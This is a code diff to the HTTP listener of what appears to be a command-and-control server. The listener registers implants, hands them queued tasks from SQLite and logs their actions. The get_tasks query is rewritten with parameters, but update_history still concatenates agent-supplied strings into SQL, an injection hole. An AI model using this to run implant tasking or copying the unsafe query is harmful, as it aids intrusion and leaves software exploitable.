@@ -2,10 +2,11 @@ from flask import Flask, request, jsonify, send_file
 from werkzeug.serving import make_server
 import threading, json, datetime, sqlite3
 
-con=0
-cur=0
+
 
 class HTTPListener:
+    con=0
+    cur=0
     def __init__(self):
         with open('modules/listeners/HTTP.json') as f:
             cfg = json.load(f)
@@ -14,8 +15,8 @@ class HTTPListener:
         self.port = cfg["port"]
         self.app = Flask(__name__)
         self.server = None
-        con = sqlite3.connect(".db")
-        cur=con.cursor()
+        self.con = sqlite3.connect(".db")
+        self.cur=self.con.cursor()
         self.app.add_url_rule('/register','register',self.register, methods=['POST'])
         self.app.add_url_rule('/<agent_id>/tasks', 'get_tasks', self.get_tasks, methods=['GET'])
         self.app.add_url_rule('/<agent_id>/tasks', 'post_tasks', self.post_tasks, methods=['POST'])
@@ -34,16 +35,30 @@ class HTTPListener:
         def shutdown(self):
             self.srv.shutdown()
     def update_history(self, agent_id, action_type, content):
-        cur.execute("INSERT INTO actions (date, action_type, content, implant_id) VALUES('" + str(datetime.datetime.now()) + "','" + action_type + "','" + content + "','" + agent_id + "');" )
+        self.cur.execute("INSERT INTO actions (date, action_type, content, implant_id) VALUES('" + str(datetime.datetime.now()) + "','" + action_type + "','" + content + "','" + agent_id + "');" )
+        self.con.commit()
 
     def get_tasks(self, agent_id):
-        cur.execute("SELECT MIN(implant_task.register_date) as data, tasks.content FROM implant_task, tasks WHERE implant_task.task_id = tasks.task_id, implant_task.executed = FALSE, implant_task.implant_id = " + agent_id)
-        task = cur.all()
-        if task!="":
-            update_history(agent_id,"get_task",task[0])
-        with open("agents/" + agent_id + "/.tasks","w") as f:
-            f.write("")
-        return task[1]
+        self.cur.execute("""
+            SELECT it.task_id, t.content 
+            FROM implant_task it
+            JOIN tasks t ON it.task_id = t.task_id
+            WHERE it.executed = 0
+            AND it.implant_id = ?
+            ORDER BY it.register_date ASC
+            LIMIT 1
+        """, (agent_id,))
+        task = self.cur.fetchone()
+        if not task:
+            return None
+        task_id, content = task
+        self.update_history(agent_id, "get_task", content)
+        self.cur.execute(
+            "UPDATE implant_task SET executed = 1, completion_date = ? WHERE task_id = ?",
+            (datetime.datetime.now(), task_id)
+        )
+        self.con.commit()
+        return content
     
     
 
